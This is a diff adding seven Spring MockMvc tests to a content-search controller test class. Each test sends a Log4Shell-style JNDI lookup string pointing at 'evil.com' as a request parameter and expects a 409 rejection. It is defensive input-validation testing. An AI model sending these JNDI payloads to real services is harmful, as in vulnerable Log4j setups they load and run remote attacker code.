@@ -1223,4 +1223,64 @@ class AdvContentSearchControllerTest extends AbstractControllerIntegrationTest {
         super.waitNotifyingThread();
     }
 
+    @Test
+    void testFacetedContentsWithInvalidLangReturns409() throws Exception {
+        ResultActions result = mockMvc
+                .perform(get("/plugins/advcontentsearch/facetedcontents")
+                        .param("lang", "${jndi:ldap://evil.com/exploit}"));
+        result.andExpect(status().isConflict());
+    }
+
+    @Test
+    void testContentsWithInvalidLangReturns409() throws Exception {
+        ResultActions result = mockMvc
+                .perform(get("/plugins/advcontentsearch/contents")
+                        .param("lang", "${jndi:ldap://evil.com/exploit}"));
+        result.andExpect(status().isConflict());
+    }
+
+    @Test
+    void testInjectionInSortReturns409() throws Exception {
+        ResultActions result = mockMvc
+                .perform(get("/plugins/advcontentsearch/facetedcontents")
+                        .param("sort", "${jndi:ldap://evil.com}"));
+        result.andExpect(status().isConflict());
+    }
+
+    @Test
+    void testInjectionInFilterAttributeReturns409() throws Exception {
+        ResultActions result = mockMvc
+                .perform(get("/plugins/advcontentsearch/facetedcontents")
+                        .param("filters[0].attribute", "${jndi:ldap://evil.com}")
+                        .param("filters[0].operator", "eq")
+                        .param("filters[0].value", "test"));
+        result.andExpect(status().isConflict());
+    }
+
+    @Test
+    void testInjectionInFilterValueReturns409() throws Exception {
+        ResultActions result = mockMvc
+                .perform(get("/plugins/advcontentsearch/facetedcontents")
+                        .param("filters[0].entityAttr", "typeCode")
+                        .param("filters[0].operator", "eq")
+                        .param("filters[0].value", "${jndi:ldap://evil.com}"));
+        result.andExpect(status().isConflict());
+    }
+
+    @Test
+    void testInjectionInCsvCategoriesReturns409() throws Exception {
+        ResultActions result = mockMvc
+                .perform(get("/plugins/advcontentsearch/facetedcontents")
+                        .param("csvCategories", "${jndi:ldap://evil.com}"));
+        result.andExpect(status().isConflict());
+    }
+
+    @Test
+    void testInjectionInTextReturns409() throws Exception {
+        ResultActions result = mockMvc
+                .perform(get("/plugins/advcontentsearch/contents")
+                        .param("text", "${jndi:ldap://evil.com}"));
+        result.andExpect(status().isConflict());
+    }
+
 }
